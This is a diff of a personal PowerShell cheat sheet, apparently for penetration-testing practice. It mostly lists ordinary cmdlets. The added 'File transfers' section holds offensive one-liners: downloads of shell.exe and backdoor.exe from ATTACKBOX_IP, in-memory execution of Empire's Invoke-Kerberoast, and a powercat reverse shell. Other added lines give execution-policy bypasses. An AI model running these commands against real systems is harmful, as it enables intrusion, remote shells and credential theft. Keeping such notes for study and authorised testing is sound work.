@@ -4,6 +4,38 @@ Windows and Powershell are not case-sensitive, but a *stardard* readability is t
 1. Adding aliases that I might want to use instead of full command
 2. Making the comments defining explaining a better layout
 
+## Execution policy bypass And Versioning 
+```powershell
+powershell -ep bypass
+powershell.exe -exec bypass C:\Wowsershell.ps1
+$PSVersionTable
+```
+
+## File transfers
+```powershell
+(New-Object system.Net.WebClient).Downloadfile('http://ATTACKBOX_IP/shell.exe')
+
+certutil -urlcache -split -f http://$ATTACKBOX_IP/backdoor.exe
+
+
+iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
+
+Invoke-WebRequest -Uri http://$ATTACKBOX_IP -OutFile file.exe
+
+# http.server 8888 in powercat directory
+# nc -lvnp 1337
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+
+# One line NC web server
+# REQUIRES NETCAT on target!
+while(1) { cat index.html | nc -w1 -l -p 8080 }
+
+# HARDCORE GUI way:
+# Add ip to trusted sites and download
+# 
+```
+[Add to trusted sites with powershell](https://stackoverflow.com/questions/51720030/ie-browser-powershell-script-to-add-site-to-trusted-sites-list-disable-protec)
+
 ## General
 ```powershell
 Get-Command              # list of powershell commands, BEWARE OF THE LISTS
@@ -28,7 +60,7 @@ Get-PSProvider
 
 # Modules are packages that contain additional cmdlets, functions, providers, etc that an be imported into the current session
 Get-Module 
-Get-Module -ListAvaliable
+Get-Module -ListAvailable
 Get-Command -Module Defender	# Return all functions of a module
 ```
 
@@ -37,6 +69,7 @@ Get-Command -Module Defender	# Return all functions of a module
 Get-HotFix -ID
 $PSVersionTable.PSVersion
 Get-History							# Get command history
+Clear-History						# Use with care and permission
 Get-ChildItem ENV:      # Display all environment variables
 ```
 
@@ -47,14 +80,26 @@ Set-ExecutionPolicy -RemoteSigned	# -Flags -Name -ListAvailable
 
 ```
 
-## Strings and objects
+## Network information
 ```powershell
-Select-Object                                           select object -Properties Mode, Name
-        first - gets the first x object
-        last - gets the last x object
-        unique - shows the unique objects
-        skip - skips x objects
+# wmi-object in win10 are good tool to find safest lateral movement  
+Get-WmiObject Query Select from Win32_NetworkAdapterConfiguration | Where-Object Index = $device_number
+(Get-NetIPAddress | Where-Object InterfaceAlias -eq "Local Area Connection").IPv4Address | select -first 1).gettype().fullname
+```
 
+## Objects 
+```powershell
+Select-Object -Property Mode, Name
+-first 	# gets the first x object
+-last 	# gets the last x object
+-unique # shows the unique objects
+-skip   # skips x objects
+Where-Object # Filter through objects
+
+```
+
+## Strings
+```powershell
 Select-String "..." -List  # CAREFUL WHERE YOU RUN it relative to working directory location!
 Select-String $String -context 10,10			# Findstr but get the ten lines previous and after match VERY HANDY with sysinternals
 Get-ChildItem C:\ -Recurse | Select-String -Pattern "password"
@@ -102,23 +147,36 @@ Where-Object # TODO
 Import-CSV file.csv     # Read a CSV file
 ```
 
-## Processes, tasks and scheduled tasks
+## Processes tasks and scheduled tasks
 ```powershell
 Get-Process
 Get-Process -ID $PID -IncludeUserName # Owner of proccess
 Get-Process -ID $PID | Format-Table * # All data on a PID
-Get-CimInstance -className win32_process | where-object {$_.ProcessId -eq processId_goes_here } | select ParentProcessId, Name # Get parent process
+# Get parent process
+Get-CimInstance -className win32_process | where-object {$_.ProcessId -eq processId_goes_here } | select ParentProcessId, Name 
 
 # Scheduled Tasks
 schtasks
 schtasks /query /fo /LIST /v
 
-## PS Modules ##
-Import-Module module.ps1
-
 ##  Sofware ##
 # Change executionpolicy
-set-executionpolicy bypass -scope process
+Get-ExecutionPolicy
+Set-ExecutionPolicy bypass -scope process
+```
+
+## Services
+```powershell
+# Display all the Automatic StartType Services
+Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"} | Format-Table
+```
+
+## Registery
+```powershell
+# Making a new registery key
+cd HKLM:
+New-Item myKey
+New-ItemProperty -Path .\myKey\ -Name Test -Type DWORD -Value 1
 ```
 
 ## Networking
@@ -162,55 +220,7 @@ Get-NetForest
 Get-NetDomainTrust
 ```
 
-## Event Logging
+## Certificates
 ```powershell
-# General
-# Get service infomation either:
-Get-CimInstance win32_service -Filter "Description = 'System Monitor service'" # OR
-Get-Service | where-object {$_.DisplayName -like "*sysm*"}
-# Registry Query with a path to hivekey-..\child\items\
-reg query HK..\\
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational # sysmon key
-# Find what the admins are monitoring:
-findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
-
-## WinEvents
-# These are themed by find if and what admins are using sysmon to monitor
-Get-WinEvent                                           # get the events!
-Get-WinEvent -LogName Application | Where-Object { $_.ProviderName -Match 'WLMS' } # Filter event logs..generally
-Get-WinEvent -Path .\file.evtx -FilterXPath '*/System/EventID=1' | Sort-Object TimeCreated | Where-Object {$_.Message -like "*kw*"} | fl # Find EventID 
-Get-WinEvent -Path .\sysmonlog.evtx -FilterXPath '*/System/*' | Where-Object { $_.TimeCreated -ge $start -and $_.TimeCreated -le $end } | Sort-Object TimeCreated# Find Event between $start -and $end
-Get-WinEvent -LogName Application -FilterXPath '*/XML pathing/EVENTID=...'   # Eventid
-Get-WinEvent -LogName Application -FilterXPath '*/XML pathing/Provider=[@Name=""]'       # Provider name query
-# This instruction can also be done in wevtutil as well:
-wevtutil.exe qe Application /q:*/System[EventId= ] /f:text /c:1
-Get-WinEvent -LogName Application -FilterXPath '*/System/EventID=101 and */System/Provider[@Name="WLMS"]'
-Get-WinEvent -LogName Application -FilterXPath '*/System/Provider[@Name="WLMS"]'
-# Detect powershell downgrade
-Get-WinEvent -LogName "Windows PowerShell" |
-    Where-Object Id -eq 400 |
-    Foreach-Object {
-        $version = [Version] (
-            $_.Message -replace '(?s).*EngineVersion=([\d\.]+)*.*','$1')
-        if($version -lt ([Version] "5.0")) { $_ }
-}
-
-# NOTE FOR efficiency: use FilterHashTable over Where-Object 
-Get-WinEvent -FilterHashtable @{
-        LogName=''
-        ProviderName=''
-        ID=someint
-}
-#
-## EventLogs
-#
-Get-EventLog                                           #  gets replace by the get-winevent
-Get-EventLog -list 
-
-# 
-## Processes 
-#
-Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" } # Get information of a process by name
-Get-Process -ID $PID -IncludeUserName # Owner of proccess
-Get-Process -ID $PID | Format-Table * # All data on a PID
+Get-ChildItem -Path cert:\LocalMachine
 ```
